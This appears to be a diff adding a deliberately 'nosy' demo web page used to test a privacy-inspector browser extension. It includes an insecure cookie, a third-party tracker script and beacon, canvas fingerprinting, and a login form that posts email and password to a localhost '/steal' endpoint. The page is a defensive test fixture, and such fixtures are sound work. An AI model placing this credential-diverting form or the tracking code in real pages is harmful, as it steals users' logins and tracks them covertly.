@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Olfa inspector demo — a nosy shop page</title>
+    <style>
+      body { font: 16px/1.6 system-ui, sans-serif; max-width: 640px; margin: 60px auto; padding: 0 20px; }
+      .card { border: 1px solid #e4ded2; border-radius: 14px; padding: 20px; margin: 18px 0; }
+      input, button { font: inherit; padding: 9px 12px; border-radius: 8px; border: 1px solid #ccc; }
+      code { background: #f4f0e8; padding: 1px 5px; border-radius: 4px; font-size: 13px; }
+    </style>
+  </head>
+  <body>
+    <h1>Shady Deals — inspector demo</h1>
+    <p>This page deliberately does everything the inspector looks for. Open the
+      extension popup and check each tab.</p>
+
+    <div class="card">
+      <h3>1. Cookies</h3>
+      <p>Sets one cookie without <code>Secure</code>, and the tracker script sets
+        one on its own domain (a third-party cookie).</p>
+      <button id="setCookie">Set an insecure cookie</button>
+    </div>
+
+    <div class="card">
+      <h3>2. Requests</h3>
+      <p>Loads <code>tracker.js</code> and sends a beacon POST to
+        <code>localhost:8791</code> — a different host from this page's
+        <code>127.0.0.1</code>, so it counts as third-party.</p>
+      <button id="beacon">Send cross-origin POST beacon</button>
+    </div>
+
+    <div class="card">
+      <h3>3. Forms</h3>
+      <p>This login form posts your password to the tracker host, not here.</p>
+      <form action="http://localhost:8791/steal" method="post">
+        <input name="email" type="email" placeholder="Email" /><br /><br />
+        <input name="password" type="password" placeholder="Password" /><br /><br />
+        <button type="submit">Sign in</button>
+      </form>
+    </div>
+
+    <div class="card">
+      <h3>4. Storage + fingerprinting</h3>
+      <p>Writes two localStorage keys and reads a canvas fingerprint.</p>
+      <button id="fingerprint">Fingerprint me</button>
+    </div>
+
+    <script src="http://localhost:8791/tracker.js" defer></script>
+    <script>
+      document.getElementById('setCookie').addEventListener('click', () => {
+        // No Secure attribute: the inspector flags this.
+        document.cookie = 'olfa_demo_session=abc123; path=/; SameSite=Lax';
+        alert('Cookie set: olfa_demo_session (no Secure flag)');
+      });
+
+      document.getElementById('beacon').addEventListener('click', () => {
+        fetch('http://localhost:8791/beacon', {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ event: 'demo', page: location.href }),
+        })
+          .then(() => alert('POST sent to localhost:8791/beacon'))
+          .catch(() => alert('Beacon failed — is the demo server running?'));
+      });
+
+      document.getElementById('fingerprint').addEventListener('click', () => {
+        localStorage.setItem('olfa_demo_user', 'u_12345');
+        sessionStorage.setItem('olfa_demo_step', '2');
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 40;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '16px system-ui';
+        ctx.fillText('Olfa fingerprint demo', 2, 2);
+        canvas.toDataURL(); // <- the inspector hooks this call
+        alert('localStorage/sessionStorage written and canvas.toDataURL() called.');
+      });
+    </script>
+  </body>
+</html>
